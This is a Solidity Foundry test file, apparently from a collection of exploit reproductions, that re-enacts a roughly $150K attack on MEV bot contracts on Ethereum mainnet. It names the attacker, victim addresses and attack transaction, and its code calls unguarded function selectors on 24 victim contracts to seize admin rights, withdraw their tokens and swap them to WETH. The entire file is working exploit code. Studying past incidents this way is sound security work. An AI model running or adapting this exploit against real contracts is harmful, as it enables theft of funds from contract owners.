// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~$150K
// Attacker : https://etherscan.io/address/0x4e087743e8025012c4704a1953c87eeff1e6ef48
// Attack Contract : https://etherscan.io/address/0x3763b7f83358171b1660ee209f327954cc463129
// One of the victims contract : https://etherscan.io/address/0xa2473460f86e1058bdd0a2c531b15534fd403d97
// Attack Tx : https://explorer.phalcon.xyz/tx/eth/0x53eeab4447db331dbb47f93fd58a95d6faa230d559acde0687f8b5f5829e7a45

// @Analysis
// https://twitter.com/Phalcon_xyz/status/1723591214262632562

contract ContractTest is Test {
    IERC20 private constant RAIL = IERC20(0xe76C6c83af64e4C60245D8C7dE953DF673a7A33D);
    IERC20 private constant BBANK = IERC20(0xF4b5470523cCD314C6B9dA041076e7D79E0Df267);
    IERC20 private constant BUMP = IERC20(0x785c34312dfA6B74F6f1829f79ADe39042222168);
    IERC20 private constant HOPR = IERC20(0xF5581dFeFD8Fb0e4aeC526bE659CFaB1f8c781dA);
    IERC20 private constant ISP = IERC20(0xC8807f0f5BA3fa45FfBdc66928d71c5289249014);
    IERC20 private constant FMT = IERC20(0x99c6e435eC259A7E8d65E1955C9423DB624bA54C);
    IERC20 private constant MARSH = IERC20(0x5a666c7d92E5fA7Edcb6390E4efD6d0CDd69cF37);
    IERC20 private constant KEL = IERC20(0x4ABB9cC67BD3da9Eb966d1159A71a0e68BD15432);
    IERC20 private constant CELL = IERC20(0x26c8AFBBFE1EBaca03C2bB082E69D0476Bffe099);
    IERC20 private constant UNO = IERC20(0x474021845C4643113458ea4414bdb7fB74A01A77);
    IERC20 private constant KINE = IERC20(0xCbfef8fdd706cde6F208460f2Bf39Aa9c785F05D);
    IERC20 private constant TXA = IERC20(0x4463e6A3dEd0dBE3F6e15bC8420dFc55e5FeA830);
    IERC20 private constant MoFi = IERC20(0xB2dbF14D0b47ED3Ba02bDb7C954e05A72deB7544);
    IERC20 private constant ODDZ = IERC20(0xCd2828fc4D8E8a0eDe91bB38CF64B1a81De65Bf6);
    IUSDT private constant USDT = IUSDT(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    IWETH private constant WETH = IWETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
    Uni_Router_V2 private constant Router = Uni_Router_V2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    function setUp() public {
        vm.createSelectFork("mainnet", 18_552_866);
    }

    function testExploit() public {
        deal(address(this), 0 ether);
        approveAll();
        address[] memory tokens = new address[](24);
        tokens[0] = address(RAIL);
        tokens[1] = address(BBANK);
        tokens[2] = address(USDT);
        tokens[3] = address(BUMP);
        tokens[4] = address(0);
        tokens[5] = address(HOPR);
        tokens[6] = address(ISP);
        tokens[7] = address(FMT);
        tokens[8] = address(MARSH);
        tokens[9] = address(KEL);
        tokens[10] = address(CELL);
        tokens[11] = address(HOPR);
        tokens[12] = address(UNO);
        tokens[13] = address(KINE);
        tokens[14] = address(KEL);
        tokens[15] = address(TXA);
        tokens[16] = address(BUMP);
        tokens[17] = address(USDT);
        tokens[18] = address(USDT);
        tokens[19] = address(USDT);
        tokens[20] = address(USDT);
        tokens[21] = address(MoFi);
        tokens[22] = address(ODDZ);
        tokens[23] = address(USDT);

        address[] memory victims = new address[](24);
        victims[0] = 0xa2473460f86e1058bdd0A2C531B15534fD403d97;
        victims[1] = 0xe2637e705475F367c94467c4b844d58dB293aFF8;
        victims[2] = 0x2481590CD6dcC9870212974627b2E938133d724b;
        victims[3] = 0xC84C76b01f62733A6a385e9a70fd43bda0a4530C;
        victims[4] = 0x2FbC293D80EF7c0D12A65AC69BB9D9E12F049064;
        victims[5] = 0xcCb65510Af354285137a175e86f9618ACf5f4861;
        victims[6] = 0x346Bbb951f24d6744231b38ca9c1305f0985d12D;
        victims[7] = 0x4A3097cdaA8f93C8da1561328fdc13b64E710dCc;
        victims[8] = 0xdbBC243E97F083562a02c458D7182489b4aC85F6;
        victims[9] = 0xB4c6503bf5dca7C3cF98a06bEc59cf5857801D98;
        victims[10] = 0xA9fe587d7c87691Ba76f3A4a63a8A8f2c1dBf12a;
        victims[11] = 0xe53a9d90B66F7EdD7aAA22aaD474aBf45C55aF72;
        victims[12] = 0xb0852b6e58560176Cf803dC4D7d6AAe151B8F242;
        victims[13] = 0x0Aa6de644966648a5C31769d98Fe9F9881362eC8;
        victims[14] = 0xE380cB00D0a1a7CB7d71569B573B6D4d665aFf87;
        victims[15] = 0x800D11ae57133F6E27B4632b598caF630f0A55Dc;
        victims[16] = 0x956750265b7a33A8564510AF5B4b3589484aF403;
        victims[17] = 0x8d6114a24cC8cca883bBe77034f3e6F19bD8204C;
        victims[18] = 0x976248f02DA78E034F484984009b4b9f15AE1722;
        victims[19] = 0x5f507AdcE6F67a78eDF873065953a368F5C6Fa31;
        victims[20] = 0xd9047C11a85D9176B2370388D81a3DBd4F99Ad96;
        victims[21] = 0xF985cd900ec163B544623303D6383eB5C4B24712;
        victims[22] = 0x26Cae30b00f4af20894A0827f5FcAAE752B38217;
        victims[23] = 0xf5E303702b5927670998D6EC63449Cb2EDF65728;

        emit log_named_decimal_uint("Attacker WETH balance before exploit", WETH.balanceOf(address(this)), 18);
        emit log_named_decimal_uint(
            "Attacker BUMP balance before exploit", BUMP.balanceOf(address(this)), BUMP.decimals()
        );
        emit log_named_decimal_uint("Attacker ETH balance before exploit", address(this).balance, 18);

        for (uint8 i; i < tokens.length; ++i) {
            exploitMevBot(tokens[i], victims[i]);
        }

        emit log_named_decimal_uint("Attacker WETH balance after exploit", WETH.balanceOf(address(this)), 18);
        emit log_named_decimal_uint(
            "Attacker BUMP balance after exploit", BUMP.balanceOf(address(this)), BUMP.decimals()
        );
        emit log_named_decimal_uint("Attacker ETH balance after exploit", address(this).balance, 18);
    }

    function exploitMevBot(address token, address victim) internal {
        removeAdmin(token, victim);
        withdrawToken(token, victim);
        if (token == address(BUMP)) {
            BUMP.transfer(address(this), BUMP.balanceOf(address(this)));
        } else if (token != address(0)) {
            tokenToWETH(token);
        } else {
            return;
        }
    }

    function removeAdmin(address token, address victim) internal {
        address[] memory recipients = new address[](1);
        recipients[0] = address(this);
        address tokenAddr = token == address(0) ? address(0) : token;

        (bool success,) = victim.call(
            abi.encodeWithSelector(
                bytes4(0xe7d25975), address(this), address(this), tokenAddr, recipients, 4, 3, 2, 0, 0
            )
        );
        require(success, "Call to removeAdmin() not successful");
    }

    function withdrawToken(address token, address victim) internal {
        address tokenAddr = token == address(0) ? address(0) : token;

        (bool success,) = victim.call(abi.encodeWithSelector(bytes4(0x4abe11b4)));
        require(success);

        success = false;
        (success,) = victim.call(abi.encodeWithSelector(bytes4(0xd547557b)));
        require(success);

        success = false;
        (success,) = victim.call(abi.encodeWithSelector(bytes4(0x90fb9dca), tokenAddr, 0));
        require(success);
    }

    function approveAll() internal {
        RAIL.approve(address(Router), type(uint256).max);
        BBANK.approve(address(Router), type(uint256).max);
        USDT.approve(address(Router), type(uint256).max);
        BUMP.approve(address(Router), type(uint256).max);
        HOPR.approve(address(Router), type(uint256).max);
        ISP.approve(address(Router), type(uint256).max);
        FMT.approve(address(Router), type(uint256).max);
        MARSH.approve(address(Router), type(uint256).max);
        KEL.approve(address(Router), type(uint256).max);
        CELL.approve(address(Router), type(uint256).max);
        UNO.approve(address(Router), type(uint256).max);
        KINE.approve(address(Router), type(uint256).max);
        TXA.approve(address(Router), type(uint256).max);
        MoFi.approve(address(Router), type(uint256).max);
        ODDZ.approve(address(Router), type(uint256).max);
    }

    function tokenToWETH(address token) internal {
        address[] memory path = new address[](2);
        path[0] = token;
        path[1] = address(WETH);
        uint256 tokenBalance;
        if (token == address(USDT)) {
            tokenBalance = IUSDT(token).balanceOf(address(this));
        } else {
            tokenBalance = IERC20(token).balanceOf(address(this));
        }
        uint256[] memory amounts = Router.getAmountsOut(tokenBalance, path);

        Router.swapExactTokensForTokens(tokenBalance, amounts[1], path, address(this), block.timestamp + 1000);
    }

    receive() external payable {}
}
